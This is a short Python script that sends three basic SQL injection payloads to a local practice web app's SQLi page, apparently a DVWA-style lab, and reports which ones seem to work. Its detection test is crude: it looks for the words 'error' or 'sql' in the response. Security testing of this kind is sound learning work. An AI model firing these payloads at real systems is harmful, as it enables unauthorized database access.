import requests


def get_sql_injection_vulnerabilities():
    url = "http://localhost:4280/vulnerabilities/sqli/"
    payloads = ["1' OR '1'='1", "' OR 1=1 --", "1' AND '1'='2"]
    
    session = requests.Session()
    for payload in payloads:
            params = {"id": payload, "Submit": "Submit"}
            response = session.get(url, params=params)
            if response.status_code == 200:
                if "error" in response.text.lower() or "sql" in response.text.lower():
                    print(f"Payload: {payload} - Vulnerable to SQL Injection")
                else:
                    print(f"Payload: {payload} - Not vulnerable to SQL Injection")
                     
            else:
                print(f"Payload: {payload} - Failed with status code: {response.status_code}")            

if __name__ == "__main__":
    get_sql_injection_vulnerabilities()
